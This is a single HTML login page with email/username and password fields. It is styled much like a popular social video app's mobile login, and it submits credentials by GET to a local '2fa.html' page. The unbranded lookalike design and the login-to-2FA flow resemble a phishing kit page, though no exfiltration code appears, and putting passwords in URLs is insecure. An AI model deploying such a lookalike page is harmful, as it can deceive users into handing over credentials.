<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #161823;
            padding: 16px 24px;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Top Navigation Bar */
        .navbar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 44px;
            margin-bottom: 20px;
        }

        .nav-back {
            color: #161823;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 28px;
            height: 28px;
        }

        .nav-back svg {
            width: 22px;
            height: 22px;
            stroke: #161823;
            stroke-width: 2;
            fill: none;
            stroke-linecap: round;
            stroke-linejoin: round;
        }

        .nav-title {
            font-size: 17px;
            font-weight: 600;
        }

        .nav-help {
            color: #161823;
            text-decoration: none;
            border: 1.5px solid #161823;
            border-radius: 50%;
            width: 22px;
            height: 22px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 13px;
            font-weight: 600;
        }

        /* Tabs */
        .tabs-container {
            margin-bottom: 28px;
            position: relative;
        }

        .tabs {
            display: flex;
            justify-content: center;
            border-bottom: 1px solid #e1e1e3;
        }

        .tab {
            flex: 1;
            text-align: center;
            padding-bottom: 12px;
            font-size: 15px;
            font-weight: 400;
            color: #8a8b91;
            cursor: pointer;
            background: none;
            border: none;
        }

        .tab.active {
            color: #161823;
            font-weight: 600;
        }

        .tab-indicator {
            position: absolute;
            bottom: 0;
            left: 50%;
            width: 50%;
            height: 2px;
            background-color: #161823;
        }

        /* Form Inputs */
        form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .input-group {
            position: relative;
            border-bottom: 1px solid #e1e1e3;
            padding-bottom: 8px;
        }

        .input-group input {
            width: 100%;
            border: none;
            outline: none;
            font-size: 16px;
            color: #161823;
            background: transparent;
        }

        .input-group input::placeholder {
            color: #b0b1b8;
        }

        /* Forgot Password */
        .forgot-password {
            font-size: 14px;
            color: #161823;
            text-decoration: none;
            font-weight: 500;
            margin-top: 2px;
            margin-bottom: 6px;
            display: inline-block;
        }

        /* Submit Button */
        .login-btn {
            background-color: rgba(22, 24, 35, 0.06);
            color: #161823;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            padding: 14px;
            width: 100%;
            cursor: pointer;
            text-align: center;
            margin-top: 4px;
            transition: background-color 0.2s ease, color 0.2s ease;
        }

        .login-btn.active {
            background-color: #fe2c55;
            color: #ffffff;
        }
    </style>
</head>
<body>

    <!-- Top Navigation -->
    <div class="navbar">
        <a href="#" class="nav-back">
            <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
        </a>
        <span class="nav-title">Log in</span>
        <a href="#" class="nav-help">?</a>
    </div>

    <!-- Tabs -->
    <div class="tabs-container">
        <div class="tabs">
            <button type="button" class="tab">Phone</button>
            <button type="button" class="tab active">Email / Username</button>
        </div>
        <div class="tab-indicator"></div>
    </div>

    <!-- Login Form leading to 2fa.html -->
    <form action="2fa.html" method="GET">
        <div class="input-group">
            <input type="text" id="username" name="username" placeholder="Email or username" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" name="password" placeholder="Password" required>
        </div>
        
        <div>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <button type="submit" id="loginBtn" class="login-btn">Log in</button>
    </form>

    <script>
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');

        function updateButtonState() {
            if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
                loginBtn.classList.add('active');
            } else {
                loginBtn.classList.remove('active');
            }
        }

        usernameInput.addEventListener('input', updateButtonState);
        passwordInput.addEventListener('input', updateButtonState);
    </script>

</body>
</html>
